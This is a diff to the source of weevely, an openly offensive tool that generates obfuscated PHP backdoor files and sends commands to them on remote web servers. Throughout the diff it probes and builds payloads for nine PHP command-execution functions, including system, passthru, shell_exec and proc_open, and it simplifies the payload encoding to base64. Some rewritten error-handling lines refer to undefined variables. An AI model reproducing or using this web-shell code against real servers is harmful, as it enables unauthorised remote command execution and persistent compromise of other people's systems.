@@ -4,16 +4,8 @@
 from numpy import frombuffer, bitwise_xor, byte
 import getopt, sys, base64, os, urllib2, re, urlparse, os
     
-def crypt(text, key):
-  text = frombuffer( text, dtype=byte )
-  firstpad=frombuffer(( key*(len(text)/len(key)) + key)[:len(text)], dtype=byte)
-  strrepeat=frombuffer( '\x1f'*len(text), dtype=byte)
-  strrepeat2=frombuffer( '\xe0'*len(text), dtype=byte)
-  
-  bit=((text ^ firstpad) & strrepeat ) | ( text & strrepeat2 )
-  
-  toret = base64.b64encode(bit.tostring())
-  return toret     
+def crypt(text):
+  return base64.b64encode(text)
     
 class weevely:
   
@@ -79,11 +71,11 @@ class weevely:
 	if('escape') not in locals():
 	  escape=-1;
 	  
-	#self.host=host(url,pwd,escape)
 	try:
 	  self.host=host(url,pwd,escape)
 	except Exception, e:
 	  print "! Error: " + str(e) + ". Exiting."
+	  raise
 	  sys.exit(1)
 	  
 
@@ -156,9 +148,9 @@ class weevely:
     
     str_tocrypt = f_tocrypt.read()
     new_str_tocrypt = str_tocrypt.replace('%%%START_KEY%%%',key[:2]).replace('%%%END_KEY%%%',key[2:]).replace('\n','')
-    str_crypted = crypt(new_str_tocrypt,key[2:])
+    str_crypted = crypt(new_str_tocrypt)
     str_back = f_back.read()
-    new_str = str_back.replace('%%%BACK_CRYPTED%%%', str_crypted).replace('%%%START_KEY%%%',key[:2]).replace('%%%END_KEY%%%',key[2:]).replace('\n','')
+    new_str = str_back.replace('%%%BACK_CRYPTED%%%', str_crypted)
     
     f_output.write(new_str)
     print '+ Backdoor file ' + path + ' created with password '+ key + '.'
@@ -270,140 +262,51 @@ class host():
   def __init__(self,url,pwd,escape):
     self.url=url
     self.pwd=pwd
+    self.method=-1
+
+    os = self.checkbackdoor(escape)
     
-    (os, method) = self.checkbackdoor(escape)
-    
-    self.method=method
     self.os=os
 
   def checkbackdoor(self, escape):
     
     os = None
-    e = Exception("Escape method number " + str(escape) + " not works. Maybe remote function is unsupported, or url or password are wrong")
     
-    print '+ Testing backdoor with functions.. ',
-    if escape == -1 or escape==0:
-      # Eval test + OS check
-      try:
-	os = self.execute_php("echo PHP_OS;")
-      except Exception, e:
-	print 'eval() system() ',
-	
-      # System() test
-      try:
-	ret = self.execute_php("@system('echo " + self.pwd + " 2>&1');")
-      except Exception, e:
-	pass
-      else:
-	if self.pwd == ret:
-	  return os, 0
+    # Eval test + OS check
+    try:
+      os = self.execute_php("echo PHP_OS;")
+    except Exception, e:
+      print '! Eval ' + str(i) + ' invalid response: ' + ret +')'
 
-    if escape == -1 or escape==1:
-      # Passthru() test
-      print 'passthru() ',
-      try:
-	ret = self.execute_php("@passthru('echo " + self.pwd + " 2>&1');")
-      except Exception, e:
-	pass
-      else:
-	if self.pwd == ret:
-	  return os, 1
+    if escape == -1:
+      first=-1
+      for i in range(0,9):
+	try:
+	  ret = self.execute("echo " + self.pwd, i)
+	  if(ret==self.pwd):
+	    print '+ Escape ' + str(i) + ' OK!'
+	    first=i
+	  else:
+	    print '- Escape ' + str(i) + ' unexpected response ' + ret
+	except Exception, e:
+	  print '- Escape ' + str(i) + ' invalid response: ' + ret +')'
 
-    if escape == -1 or escape==2:
-      # pcntl_exec() test
-      print 'pcntl_exec() ',
-      try:
-	ret = self.execute_php("$u = Array('" + self.pwd + "'); @pcntl_exec('/bin/echo', $u);")
-      except Exception, e:
-	pass
+      if first==-1:
+	print 'No working escape function founded.'
       else:
-	if self.pwd == ret:
-	  return os, 2  
-      
-    if escape == -1 or escape==3:
-      # popen() test
-      print 'popen() ',
-      try:
-	ret = self.execute_php("$h=popen('echo " + self.pwd + " 2>&1', 'r'); while(!feof($h)) { echo fread($h, 2096); } pclose($h);")
-      except Exception, e:
-	pass
-      else:
-	if self.pwd == ret:
-	  return os, 3
-      
-    if escape == -1 or escape ==4:
-      # exec() test
-      # <?php exec('echo CULO',$o); $re = join('rn', $o); echo $re; ?>
-      print 'exec() ',
-      try:
-	ret = self.execute_php("@exec('echo " + self.pwd + " 2>&1', $o); $r = join('rn', $o); echo $r;")
-      except Exception, e:
-	pass
-      else:
-	if self.pwd == ret:
-	  return os, 4
-      
-      
-    if escape == -1 or escape ==5:
-      # shell_exec() test
-      print 'exec_shell() ',
-      try:
-	ret = self.execute_php("@shell_exec('echo " + self.pwd + " 2>&1');")
-      except Exception, e:
-	pass
-      else:
-	if self.pwd == ret:
-	  return os, 5
-      
-    if escape == -1 or escape == 6:
-      # perl extension test
-      print 'perl->eval() ',
-      try:
-	ret = self.execute_php("$perl = new perl(); $r = @perl->system('echo " + self.pwd + " 2>&1'); echo $r")
-      except Exception, e:
-	pass
-      else:
-	if self.pwd == ret:
-	  return os, 6
+	self.method = first
+	print 'Using method ' + str(self.method)
     
-    if escape == -1 or escape == 7:
-      # python extension test
-      print 'python_eval() ',
-      try:
-	ret = self.execute_php("@python_eval('import os; os.system('echo " + self.pwd + " 2>&1');")
-      except Exception, e:
-	pass
-      else:
-	if self.pwd == ret:
-	  return os, 7
-      
-    if escape == -1 or escape == 8:
-      # proc_open() test
-      #<?php 
-      #$p = array(array('pipe', 'r'), array('pipe', 'w'), array('pipe', 'w')); 
-      #$h = proc_open('echo CULO', $p, $pipes);
-      #$r = stream_get_contents ($pipes[1]); $r .= stream_get_contents ($pipes[2]);
-      #fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($h);
-      #echo $r;
-      #?>
-      tosend = "array(array('pipe', 'r'), array('pipe', 'w'), array('pipe', 'w')); $h = proc_open('echo " + self.pwd + "', $p, $pipes);"
-      tosend += "$r = stream_get_contents ($pipes[1]); $r .= stream_get_contents ($pipes[2]); fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($h); echo $r;"
-      print 'proc_open()'
-      try:
-	ret = self.execute_php(tosend)
-      except Exception, e:
-	pass
-      else:
-	if self.pwd == ret:
-	  return os, 8
-      
-    raise e;
+    else:
+      self.method = escape
+      print 'Using method ' + str(self.method)
     
-    
+    return os
+
   def execute_php(self,cmnd):
     
     cmnd=cmnd.strip()
-    cmdstr=crypt(cmnd,self.pwd[2:])
+    cmdstr=crypt(cmnd)
     
     
     # http://www.google.com/url?sa=t&source=web&ct=res&cd=7&url=http%3A%2F%2Fwww.example.com%2Fmypage.htm&ei=0SjdSa-1N5O8M_qW8dQN&rct=j&q=flowers&usg=AFQjCNHJXSUh7Vw7oubPaO3tZOzz-F-u_w&sig2=X8uCFh6IoPtnwmvGMULQfw
@@ -424,27 +327,29 @@ class host():
 	return founded[0].strip()
 
   
-  def execute(self, cmnd):
+  def execute(self, cmnd, met=-1):
     
-    if(self.method==0):
+    if(met==-1):
+      met=self.method
+      
+    if(met==0):
       cmnd="@system('" + cmnd + " 2>&1');"
-    elif(self.method==1):
-      cmnd="@passthru('" + cmnd + " 2>&1');"
-    elif(self.method==2):
-      cmnd="$u = Array('" + cmnd[1:] + "'); @pcntl_exec('" + cmnd[0] + "', $u);"
-    elif(self.method==3):
-      cmnd="$h=popen('" + cmnd + "', 'r'); while(!feof($h)) { echo fread($h, 2096); } pclose($h);"
-    elif(self.method==4):
-      cmnd="@exec('" + cmnd + " 2>&1', $o); $r = join('rn', $o); echo $r;"
-    elif(self.method==5):
-      cmnd="@shell_exec('" + cmnd + " 2>&1');"
-    elif(self.method==6):
+    elif(met==1):
+      cmnd="passthru('" + cmnd + " 2>&1');"
+    elif(met==2):
+      cmnd="$u = array('" + "','".join(cmnd.split(' ')[1:]) + "'); pcntl_exec('" + cmnd.split()[0] + "', $u);"
+    elif(met==3):
+      cmnd="$h=popen('" + cmnd + "', 'r'); echo stream_get_contents($h); pclose($h);"
+    elif(met==4):
+      cmnd="echo @exec('" + cmnd + " 2>&1');"
+    elif(met==5):
+      cmnd="shell_exec('" + cmnd + " 2>&1');"
+    elif(met==6):
       cmnd="$perl = new perl(); $r = @perl->system('" + cmnd + " 2>&1'); echo $r"
-    elif(self.method==7):
+    elif(met==7):
       cmnd="@python_eval('import os; os.system('" + cmnd + " 2>&1');"
-    elif(self.method==8):
-      cmnd = "array(array('pipe', 'r'), array('pipe', 'w'), array('pipe', 'w')); $h = proc_open('" + cmnd + "', $p, $pipes);"
-      cmnd += "$r = stream_get_contents ($pipes[1]); $r .= stream_get_contents ($pipes[2]); fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($h); echo $r;"
+    elif(met==8):
+      cmnd = "$p = array(array('pipe', 'r'), array('pipe', 'w'), array('pipe', 'w')); $h = proc_open('" + cmnd + "', $p, $pipes); $r = stream_get_contents ($pipes[1]); echo $r . stream_get_contents($pipes[2]); fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($h);"
     
     return self.execute_php(cmnd)
     
